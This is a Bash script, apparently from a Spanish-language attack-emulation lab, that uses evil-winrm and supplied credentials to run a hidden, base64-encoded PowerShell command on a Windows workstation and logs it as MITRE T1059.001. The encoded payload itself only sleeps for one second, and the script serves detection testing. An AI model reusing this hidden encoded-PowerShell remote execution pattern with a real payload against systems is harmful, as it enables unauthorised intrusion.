#!/usr/bin/env bash
# Ataque 5: Ejecucion de payload malicioso (MITRE T1204.002 / T1059.001)
# Simula la entrega y ejecucion de un comando ofuscado tipo "living off the land",
# analogo al comportamiento observado tras macros maliciosas o adjuntos de phishing.
# Uso: ./attack5_payload_exec.sh <IP_WIN_WORKSTATION>
set -euo pipefail
source "$(dirname "$0")/_lib_log_ataque.sh"
TARGET="${1:?Uso: $0 <IP_ESTACION_WINDOWS>}"

INICIO=$(log_inicio)
echo "[+] Entregando y ejecutando payload de prueba en ${TARGET} via WinRM (evil-winrm)..."
# Requiere credenciales validas de un usuario local/dominio para el ejercicio controlado
read -rp "Usuario WinRM: " WU
read -rsp "Password WinRM: " WP; echo
CMD='powershell -nop -w hidden -enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAAMQA='
evil-winrm -i "${TARGET}" -u "${WU}" -p "${WP}" -e "${CMD}" 2>&1 | tee "/tmp/payload_$(date +%s).log" || true
log_fin "payload_execution" "T1059.001" "${TARGET}" "${INICIO}" "1"
echo "[+] Ataque registrado en log_ataques.csv"
